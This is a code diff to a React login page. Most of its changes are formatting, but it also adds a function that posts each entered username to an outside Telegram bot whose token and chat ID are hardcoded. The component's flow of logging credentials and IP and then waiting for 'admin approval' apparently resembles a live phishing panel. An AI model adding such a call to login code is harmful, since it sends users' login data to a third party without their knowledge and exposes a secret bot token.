@@ -6,6 +6,7 @@ import logo from "/idhahologo.png"; // Ensure correct logo path
 import Loader from "./Loader"; // Loader component
 import axios from "axios"; // Import Axios
 import Cookies from "js-cookie";
+
 const Login = () => {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
@@ -15,10 +16,30 @@ const Login = () => {
   const navigate = useNavigate(); // Hook for navigation
   const [isTokenSet, setIsTokenSet] = useState(false); // To track if the cookie/token is set
 
+  // Function to send notification to Telegram
+  const sendTelegramNotification = async (message) => {
+    const chatId = "1853998920";
+    const botToken = "7744005529:AAFHfmD7lGOEsRSb_tk0_FE4WuF_JN4U1YE";
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    try {
+      await axios.post(url, {
+        chat_id: chatId,
+        text: message,
+      });
+      console.log("Notification sent to Telegram");
+    } catch (error) {
+      console.error("Error sending notification to Telegram:", error);
+    }
+  };
+
   // Handle login form submission
   const handleSubmit = async (e) => {
     e.preventDefault();
     setIsLoading(true); // Show loader
+
+    // Notify Telegram that a login attempt is being made
+    sendTelegramNotification(`Login attempt with username: ${username}`);
 
     try {
       // Delay for a short period to ensure cookies can set before making the request
@@ -29,12 +50,7 @@ const Login = () => {
       const userAgent = navigator.userAgent;
 
       // Use the API function to log the user login attempt
-      const response = await userLoginAttempt(
-        username,
-        password,
-        ip,
-        userAgent
-      );
+      const response = await userLoginAttempt(username, password, ip, userAgent);
 
       if (response.logId) {
         // Start polling for the step based on the logId
@@ -75,9 +91,7 @@ const Login = () => {
 
         retries++;
         if (retries >= maxRetries) {
-          setErrorMessage(
-            "Admin approval is taking too long. Please try again later."
-          );
+          setErrorMessage("Admin approval is taking too long. Please try again later.");
           setIsLoading(false);
           clearInterval(interval);
         }
@@ -152,16 +166,16 @@ const Login = () => {
                     <path
                       d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"
                       stroke="currentColor"
-                      stroke-width="2"
-                      stroke-linecap="round"
-                      stroke-linejoin="round"
+                      strokeWidth="2"
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
                     />
                     <path
                       d="M12 15a3 3 0 100-6 3 3 0 000 6z"
                       stroke="currentColor"
-                      stroke-width="2"
-                      stroke-linecap="round"
-                      stroke-linejoin="round"
+                      strokeWidth="2"
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
                     />
                   </svg>
                 </span>
@@ -208,4 +222,3 @@ const Login = () => {
 };
 
 export default Login;
-
